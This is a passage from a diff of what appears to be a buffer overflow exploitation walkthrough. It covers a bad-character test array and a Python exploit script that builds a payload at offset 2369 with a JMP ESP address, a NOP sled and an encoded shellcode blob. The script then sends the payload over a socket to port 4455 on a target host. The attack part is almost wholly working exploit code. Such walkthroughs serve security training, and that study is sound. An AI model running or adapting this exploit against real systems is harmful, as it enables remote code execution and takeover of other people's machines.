@@ -59,7 +59,9 @@ EIP value: '42424242' = 'BBBB'
 
 ### 5. CHECK FOR BAD CHARACTERS
 
-Characters to test (256 in total): **NOTE: WE DON'T INCLUDE NULL CHAR \x00**
+Characters to test (256 in total):
+
+**NOTE: WE DON'T INCLUDE NULL CHAR \x00**
 ```python
 chars =(
 "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
@@ -125,7 +127,7 @@ Final payload:
 #!/usr/bin/python
 #
 #[*] Exact match at offset 2369
-#76E295FD
+#[*] JMP_ESP address at 524366fe (\x43\x66\xfe\x52 as it appears on Immunity Debugger)
 
 import sys, socket
 
@@ -160,13 +162,16 @@ shellcode = ("\xd9\xc6\xd9\x74\x24\xf4\x5f\x31\xc9\xbd\xc5\x06\x1f\x5e\xb1"
 "\x7a\x3b\xe0\x25\xf9\xc9\x99\xd1\xe1\xb8\x9c\x9e\xa5\x51\xed"
 "\x8f\x43\x55\x42\xaf\x41")
 
-JMP_ESP = "\x43\x66\xfe\x52"
-NOPS = "\x90"*16
-junk = "\x41"*2369 + JMP_ESP + NOPS + shellcode + "C"*(3000-2369-4-16-351)
+junk = "A"*2369
+jmp_esp = "\x43\x66\xfe\x52"
+offset = "C"*4
+nops = "\x90"*16
+buffer = "C"*(3000-2369-4-16-351)
 
 end = "\r\n"
 
-buffer = cmd + junk + end
+buffer = cmd + junk + jmp_esp + offset + nops + shellcode + buffer + end
+
 try:
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect((sys.argv[1], 4455))
